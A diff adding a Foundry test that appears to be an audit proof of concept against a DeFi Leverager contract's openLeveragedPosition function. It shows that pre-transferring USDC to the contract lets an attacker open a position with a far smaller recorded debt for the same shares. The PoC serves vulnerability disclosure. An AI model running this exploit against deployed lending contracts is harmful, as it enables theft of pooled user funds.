@@ -1,5 +1,5 @@
-// SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.13;
+// SPDX-License-Identifier: GPL-2.0
+pragma solidity ^0.8.0;
 
 import "forge-std/Test.sol";
 import {Vault} from "../src/Vault.sol";
@@ -809,6 +809,57 @@ contract LeveragerTest is BaseTest {
         vm.startPrank(depositor);
         vm.expectRevert("borrower not leverager");
         ILendingPool(lendingPool).pullFunds(address(usdc), 100e6);
+    }
+
+
+
+    //@audit PoC of Leverager.sol:: openLeveragedPosition
+    function test_openLeveragedPosition() public {
+        address attakcer =makeAddr("attakcer");
+        deal(address(wbtc), attakcer, 5e8);//token0
+        deal(address(usdc), attakcer, 800_000e6);//token1
+
+        IMainnetRouter.ExactOutputParams memory ep = IMainnetRouter.ExactOutputParams({
+            path: abi.encodePacked(address(wbtc), uint24(3000), address(usdc)),
+            recipient : leverager,
+            deadline: block.timestamp,
+            amountOut : 0,
+            amountInMaximum : type(uint256).max
+        });
+
+        ILeverager.LeverageParams memory lp=ILeverager.LeverageParams({
+            amount0In: 0.05e8,
+            amount1In: 5_000e6,
+            vault0In: 0.1e8,
+            vault1In: 10_000e6,
+            min0in:0,
+            min1in:0,
+            vault: vault,
+            denomination: address(usdc),
+            maxBorrowAmount: 20_000e6, //the amout that the Leverager contract would borrow in the first place
+            swapParams1: abi.encode(ep),//token0，WBTC is not the denomination token,so this fits the first condition
+            swapParams2: abi.encode(0)
+        });
+
+
+        vm.startPrank(attakcer);   
+        wbtc.approve(leverager, type(uint256).max);
+        usdc.approve(leverager, type(uint256).max);
+        //1. first the attakcer transfer some denominated token to the leverager contract
+
+        // comment this line, and the log result would change, if change the number to 90_000e6, Arithmetic underflow will occure
+         usdc.transfer(leverager,9_000e6);
+
+        
+        //2. then the attakcer call the openLeveragedPosition function
+       uint256 id = ILeverager(leverager).openLeveragedPosition(lp); 
+
+        //3. check the borrowed amout of the attacker
+        //   and you will find the initial underlyingBalace in LendingPool >> position.borrowedAmount+ underlyingBalance after.  
+        ILeverager.Position memory position = ILeverager(leverager).getPosition(id);
+        console.log(position.shares); //gain same share 10000000000 with different borrowed amount
+        console.log(position.borrowedAmount);// attacking result:593_160_361, normal result:9_593_160_361
+
     }
 
 
